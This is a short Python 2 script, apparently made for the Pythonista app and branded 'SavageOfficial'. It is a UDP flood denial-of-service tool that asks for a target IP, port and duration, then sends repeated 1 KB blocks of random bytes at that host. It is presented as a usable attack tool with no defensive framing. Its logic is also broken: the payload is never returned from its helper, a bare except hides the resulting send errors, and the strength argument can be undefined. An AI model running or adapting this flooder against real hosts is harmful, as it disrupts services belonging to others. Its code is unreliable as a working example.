import socket, sys, os, time, itertools, threading, random, console

def credits():
	import console
	console.set_color(130, 0, 0)
	print "\n     -+--=:=-  -++-  -=:=--+-"
	console.set_color()
	console.set_font('HoeflerText-Black')
	print " " * 32 + "SavageOfficial"
	console.set_font()
	console.set_color(130, 0, 0)
	print "     -+--=:=-  -++-  -=:=--+-\n"
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
stop = False
for i in sys.argv:
	if i == "-s":
		stop = True
	else:
		if stop:
			strength = i
			break
print strength
def byt(strength):
	bytes = random._urandom(1024) * int(strength)
try:
	if len(str(strength)) == 0:
		byt(8)
except:
	byt(strength)
	pass
credits()
victim = raw_input(' -+- Target: ')
vport = input(' -+- Port: ')
duration = input(' -+- Run: ')
console.set_color()
print ""
timeout = time.time() + duration
sent = 0
while 1:
	if time.time() > timeout:
		break		
	else:
		pass
	try:
		client.sendto(bytes, (victim, vport))
		client.sendto(bytes, (victim, vport))
		client.sendto(bytes, (victim, vport))
		client.sendto(bytes, (victim, vport))
		client.sendto(bytes, (victim, vport))
	except ValueError:
		pass
	except:
		pass
	sent = sent + 5
	print "%s Packets: %s Port: %s "%(sent, victim, vport)
